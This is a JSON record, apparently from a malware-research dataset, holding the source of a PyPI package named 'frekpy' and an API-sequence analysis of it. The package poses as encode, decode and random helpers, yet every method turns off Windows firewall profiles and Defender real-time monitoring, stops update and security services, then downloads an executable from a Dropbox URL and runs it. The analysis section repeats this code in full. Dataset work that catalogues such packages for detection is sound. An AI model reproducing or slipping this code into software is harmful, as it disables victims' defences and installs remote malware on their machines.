[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/frekpy-4.0/frekpy-4.0/frekpy/__init__.py",
    "code_snippet": "import os\ntry: import requests\nexcept:\n    os.system(\"pip install requests||py -m pip install requests\")\n    import requests\n\ndef pws():\n    comandos: list[str] = [\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set allprofiles state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set currentprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $ true\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set domainprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Uninstall-WindowsFeature -Name Windows-Defender\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\"\n        \"net stop wuauserv\",\n        \"net stop bits\",\n        \"net stop dosvc\",\n        \"net stop spooler\",\n        \"net stop wscsvc\",\n        \"net stop wuauserv\",\n        \"net stop wudfsvc\",\n        \"net stop wwanSvc\"\n    ]\n    for comando in comandos:\n        try: os.system(comando)\n        except: pass\n\ndef inf():\n    try:\n        file = os.environ['TEMP'] + \"\\\\Python-3.9.exe\"\n        open(file, \"wb\").write(requests.get(\"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\").content)\n        os.system(file)\n    except:\n        raise Exception(\"This module can only be executed on machines with Windows systems.\")\n\n# The following classes repeatedly invoke the above malicious functions\nclass encode:\n    @staticmethod\n    def b64(txt: str) -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"AJ42NSDL1ADnluh32jad1ND=\"\n    @staticmethod\n    def init() -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def start(method: int) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\nclass decode:\n    @staticmethod\n    def b64(txt: str) -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"AJ23NSD321LAD4nlu634hjadND=\"\n    @staticmethod\n    def init() -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def start(method: int) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\nclass random:\n    @staticmethod\n    def randint(n1: int,\n                n2: int\n                ) -> int:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return 12\n    @staticmethod\n    def randstr() -> str:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return \"B\"\n    @staticmethod\n    def randlist(method: int) -> list[str]:\n        for script in [pws, inf]:\n            try: script()\n            except: pass\n        return [\"asdAS134asdvcxdsf\", \"iasaoiWJlPUEFsLJNpuohxas\"]\n    @staticmethod\n    def flush(dpi: str) -> None:\n        for script in [pws, inf]:\n            try: script()\n            except: pass",
    "pattern_analysis": {
      "api_sequence": [
        "os.system",
        "os.environ",
        "open",
        "requests.get",
        "open.write",
        "os.system"
      ],
      "api_sequence_with_args": [
        "os.system(comando)",
        "os.environ['TEMP']",
        "open(file, \"wb\")",
        "requests.get(\"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\")",
        "open(file, \"wb\").write(requests.get(...).content)",
        "os.system(file)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import os\ntry: import requests\nexcept:\n    os.system(\"pip install requests||py -m pip install requests\")\n    import requests\n\ndef pws():\n    comandos: list[str] = [\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set allprofiles state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set currentprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $ true\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe netsh advfirewall set domainprofile state off\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Uninstall-WindowsFeature -Name Windows-Defender\",\n        \"%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\"\n        \"net stop wuauserv\",\n        \"net stop bits\",\n        \"net stop dosvc\",\n        \"net stop spooler\",\n        \"net stop wscsvc\",\n        \"net stop wuauserv\",\n        \"net stop wudfsvc\",\n        \"net stop wwanSvc\"\n    ]\n    for comando in comandos:\n        try: os.system(comando)\n        except: pass\n\ndef inf():\n    try:\n        file = os.environ['TEMP'] + \"\\\\Python-3.9.exe\"\n        open(file, \"wb\").write(requests.get(\"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\").content)\n        os.system(file)\n    except:\n        raise Exception(\"This module can only be executed on machines with Windows systems.\")"
    }
  }
]